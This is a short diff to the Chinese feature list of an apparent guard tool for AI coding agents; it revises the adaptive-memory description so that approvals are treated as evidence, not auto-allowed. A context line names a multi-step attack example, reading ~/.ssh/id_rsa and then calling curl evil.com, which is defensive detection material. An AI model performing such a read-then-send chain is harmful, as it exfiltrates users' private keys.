@@ -31,7 +31,7 @@ features:
     details: Claude Code、Codex CLI、Gemini CLI、OpenCode、OpenClaw、Cursor、GitHub Copilot CLI，开箱即用。
   - icon: 🧠
     title: 从使用中持续学习
-    details: 自适应记忆系统记录每次审批/拒绝决策。频繁被审批的操作会自动放行，让判断越来越准。
+    details: 自适应记忆系统把审批/拒绝决策作为证据记录，用来校准判断，但不会盲目信任压缩后的模式。
   - icon: 🔗
     title: 多步攻击检测
     details: 链式分析跨工具调用追踪序列，能识别孤立看似无害但组合危险的攻击，如 read ~/.ssh/id_rsa → curl evil.com。
